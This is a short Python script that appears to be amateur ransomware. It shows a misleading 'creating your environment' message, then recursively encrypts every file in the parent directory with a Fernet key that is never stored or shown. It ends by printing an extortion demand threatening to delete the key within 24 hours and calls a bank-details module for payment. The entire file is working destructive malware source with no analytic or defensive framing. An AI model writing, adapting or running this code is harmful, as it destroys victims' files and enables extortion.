# importing all required libraries
import fernet,os,colorama,logging
print('welcome')
print('creating your environment.... please wait')
current_path = os.getcwd()
# Target files or directory
working_directory = os.path.dirname(current_path)

# generating a key
key = fernet.Fernet.generate_key()

# creating a log file 
with open(current_path + '/logs.txt','w') as log_file :
   log_file.write(' \t \t This is a log file \n')
     


          
        
success,failed = 0,0      
# Encrypting files
def file_encrypter(path) :
    global success,failed
    try :
        with open(path,'rb') as file :
            byte_file = file.read()
        encrypted_file = fernet.Fernet(key).encrypt(byte_file)
        with open(path,'wb') as file :
            file.write(encrypted_file)
    except Exception as error_type :
              logging.basicConfig(filename = current_path + '/logs.txt',level = logging.ERROR)
              logging.getLogger().error(f'This path ({path}) was unsuccessfully encrypted due to {error_type}')
              failed += 1
    else :
            logging.basicConfig(filename = current_path + '/logs.txt',level = logging.DEBUG)
            logging.log(level = logging.DEBUG,msg = f'This {path} was successfully encrypted')
            success += 1

# getting files
def Get_root_files(path) :
    length_of_files = len(os.listdir(path))
    for file in range(length_of_files) :
       current = os.listdir(path)[file]
       current = path + '/' + os.listdir(path)[file]
       if current == working_directory + '/Ransomware by Destiny' :
            continue
       if os.path.isdir(current) == True :
           Get_root_files(current)
       elif os.path.isfile(current) == True :
               file_encrypter(current)
       if file == length_of_files - 1 :
          char = '/' + os.listdir(path)[file]
          current = current.replace(char,'')
Get_root_files(working_directory)

logging.log(msg = f'SUMMARY : {success} was sucessufully encrypted out of {success + failed}',level = logging.DEBUG)
print(colorama.Fore.RED + 'You have been hacked')
print('All your files are encrypted')
print('Pay me money or i will delete the key in 24 hours ....')
print('i have {} files encrypted already !!'.format(success))
print(colorama.Style.RESET_ALL + colorama.Style.BRIGHT)



# intializing mode for payment
from bank_details import bank_info,money_logger
bank_info()
